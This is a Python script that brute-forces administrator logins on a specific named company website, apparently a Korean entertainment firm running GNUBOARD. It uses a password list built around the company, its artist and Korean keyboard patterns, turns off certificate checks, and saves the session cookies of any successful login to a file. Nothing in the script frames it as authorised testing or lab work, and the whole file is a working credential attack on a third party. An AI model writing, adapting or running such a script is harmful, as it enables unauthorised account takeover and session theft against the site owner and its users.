#!/usr/bin/env python3
"""pnation.com admin brute force - DB is healthy, site is up"""
import requests, urllib3, time, sys, re
urllib3.disable_warnings()

T = "https://pnation.com"

users = ["admin", "master", "pnation", "psy", "manager", "administrator", "webmaster", "root"]

# Password list optimized for Korean entertainment company
passwords = [
    # Numbers
    "1234", "12345", "123456", "12345678", "123456789",
    "1111", "0000", "000000", "2222", "5555",
    # Common
    "password", "admin", "admin123", "admin1234", "admin1", "admins",
    # Pnation specific
    "pnation", "pnation123", "pnation1", "pnation2019", "pnation2024", "pnation99",
    "Pnation", "Pnation123", "PNATION",
    # Psy
    "psy123", "psy1234", "psy12345", "gangnam", "psypsy", "Psy123",
    # Korean keyboard
    "dkssud", "dkssudgktpdy", "rhksflwk", "gksrnr", "ekdms",
    # Patterns
    "qwer1234", "1q2w3e4r", "zxcv1234", "asdf1234",
    "a123456", "a123456789", "qwerty", "iloveyou",
    "korea123", "seoul123", "incheon",
    # GNUBOARD
    "gnuboard5", "g5admin", "g5",
    # Korean words
    "dlatl", "tkatjd", "dltkdgns",
]

def try_login(user, pw):
    try:
        r = requests.post(f"{T}/bbs/login_check.php",
            data={"mb_id": user, "mb_password": pw, "url": T},
            verify=False, timeout=15, allow_redirects=False)
        if r.status_code == 302:
            return "SUCCESS", r.cookies.get_dict(), r.headers.get("Set-Cookie", "")
        if len(r.text) > 1000:
            return "wrong", None, None
        return "error", None, None
    except Exception as e:
        return f"timeout:{e}", None, None

print(f"Target: {len(users)} users x {len(passwords)} passwords")
print("=" * 60)

for user in users:
    found = False
    print(f"\n[{user}] ", end="", flush=True)
    tried = 0
    for pw in passwords:
        result, cookies, setcookie = try_login(user, pw)
        tried += 1
        if result == "SUCCESS":
            print(f"\n>>> FOUND: {user}:{pw} <<<")
            print(f"Cookies: {cookies}")
            print(f"Set-Cookie: {setcookie}")
            # Save
            with open("admin_cookies.txt", "w") as f:
                f.write(str(cookies))
            found = True
            break
        elif result == "wrong":
            pass  # silent
        elif "timeout" in result:
            print(f"T", end="", flush=True)
            time.sleep(2)
        else:
            print(f"E", end="", flush=True)
            time.sleep(1)
        time.sleep(0.15)  # rate limit
    if not found:
        print(f"({tried} tried)")
    else:
        break

print("\nDone")
